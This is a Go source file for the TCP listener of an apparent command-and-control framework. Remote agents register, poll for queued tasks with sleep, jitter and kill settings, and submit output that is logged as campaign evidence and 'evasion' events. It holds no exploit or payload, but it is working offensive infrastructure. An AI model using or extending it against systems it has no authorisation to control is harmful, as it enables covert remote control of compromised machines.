package api

import (
	"context"
	"encoding/binary"
	"encoding/json"
	"io"
	"net"
	"time"

	"github.com/BroJustLeaveMeAlone/DungeonMaster-C2/server/internal/collab"
	"github.com/BroJustLeaveMeAlone/DungeonMaster-C2/server/internal/session"
	"go.uber.org/zap"
)

// TCPServer handles raw agent connections over TCP.
// Protocol: each message is [4-byte LE length][JSON body].
// Request envelope: {"type":"register"|"poll"|"submit","body":{...}}
type TCPServer struct {
	sessions *session.Manager
	bus      *collab.Bus
	log      *zap.Logger
}

func NewTCPServer(sessions *session.Manager, bus *collab.Bus, log *zap.Logger) *TCPServer {
	return &TCPServer{sessions: sessions, bus: bus, log: log}
}

func (s *TCPServer) Serve(ctx context.Context, addr string) error {
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		return err
	}
	go func() {
		<-ctx.Done()
		ln.Close()
	}()
	s.log.Info("TCP C2 listener started", zap.String("addr", addr))
	for {
		conn, err := ln.Accept()
		if err != nil {
			select {
			case <-ctx.Done():
				return nil
			default:
				s.log.Warn("TCP accept error", zap.Error(err))
				continue
			}
		}
		go s.handleConn(ctx, conn)
	}
}

func (s *TCPServer) handleConn(ctx context.Context, conn net.Conn) {
	defer conn.Close()
	ip, _, _ := net.SplitHostPort(conn.RemoteAddr().String())

	for {
		// Per-iteration deadline: prevents goroutine leak from an idle or stalled agent.
		conn.SetDeadline(time.Now().Add(90 * time.Second))
		var lenBuf [4]byte
		if _, err := io.ReadFull(conn, lenBuf[:]); err != nil {
			return
		}
		msgLen := binary.LittleEndian.Uint32(lenBuf[:])
		if msgLen == 0 || msgLen > 32*1024*1024 {
			return
		}
		body := make([]byte, msgLen)
		if _, err := io.ReadFull(conn, body); err != nil {
			return
		}

		resp := s.dispatch(ctx, ip, body)
		respLen := make([]byte, 4)
		binary.LittleEndian.PutUint32(respLen, uint32(len(resp)))
		if _, err := conn.Write(append(respLen, resp...)); err != nil {
			return
		}
	}
}

func (s *TCPServer) dispatch(ctx context.Context, ip string, body []byte) []byte {
	var env struct {
		Type string          `json:"type"`
		Body json.RawMessage `json:"body"`
	}
	if err := json.Unmarshal(body, &env); err != nil {
		return errResp("bad envelope")
	}

	switch env.Type {
	case "register":
		return s.doRegister(ctx, ip, env.Body)
	case "poll":
		return s.doPoll(ctx, env.Body)
	case "submit":
		return s.doSubmit(ctx, env.Body)
	default:
		return errResp("unknown type")
	}
}

func (s *TCPServer) doRegister(ctx context.Context, ip string, raw json.RawMessage) []byte {
	var req session.RegisterRequest
	if err := json.Unmarshal(raw, &req); err != nil {
		return errResp("bad register body")
	}
	req.IPExternal = ip

	resp, err := s.sessions.Register(ctx, req)
	if err != nil {
		s.log.Error("tcp: register", zap.Error(err))
		return errResp("register failed")
	}

	go s.bus.Publish(ctx, collab.NewSessionCheckinEvent(req.CampaignID, resp.SessionID))

	b, _ := json.Marshal(resp)
	return b
}

func (s *TCPServer) doPoll(ctx context.Context, raw json.RawMessage) []byte {
	var req struct {
		SessionID string `json:"session_id"`
	}
	if err := json.Unmarshal(raw, &req); err != nil {
		return errResp("bad poll body")
	}

	hb, err := s.sessions.Heartbeat(ctx, req.SessionID)
	if err != nil {
		return errResp("session not found")
	}

	type pollResp struct {
		Tasks        []session.Task `json:"tasks"`
		SleepSeconds int            `json:"sleep_seconds"`
		JitterPct    int            `json:"jitter_pct"`
		Kill         bool           `json:"kill"`
	}
	resp := pollResp{SleepSeconds: hb.SleepSeconds, JitterPct: hb.JitterPct, Kill: hb.Kill}
	if !hb.Kill && !hb.Revoked {
		tasks, _ := s.sessions.PendingTasks(ctx, req.SessionID)
		resp.Tasks = tasks
	}

	b, _ := json.Marshal(resp)
	return b
}

func (s *TCPServer) doSubmit(ctx context.Context, raw json.RawMessage) []byte {
	var req session.CompleteTaskRequest
	if err := json.Unmarshal(raw, &req); err != nil {
		return errResp("bad submit body")
	}
	if err := s.sessions.CompleteTask(ctx, req); err != nil {
		s.log.Error("tcp: complete task", zap.Error(err))
		return errResp("complete failed")
	}

	sess, _ := s.sessions.Get(ctx, req.SessionID)
	if sess != nil {
		go s.bus.Publish(ctx, collab.NewTaskOutputEvent(sess.CampaignID, req.SessionID, req.TaskID, req.Output))
		if req.EvasionEvent {
			go s.bus.Publish(ctx, collab.NewEvasionEvent(sess.CampaignID, req.SessionID, req.TaskID, req.EvasionDescription))
		}
		if len(req.Output) > 0 {
			go storeEvidence(s.log, sess, req.TaskID, req.Output)
		}
	}

	return []byte(`{"ok":true}`)
}

func errResp(msg string) []byte {
	b, _ := json.Marshal(map[string]string{"error": msg})
	return b
}
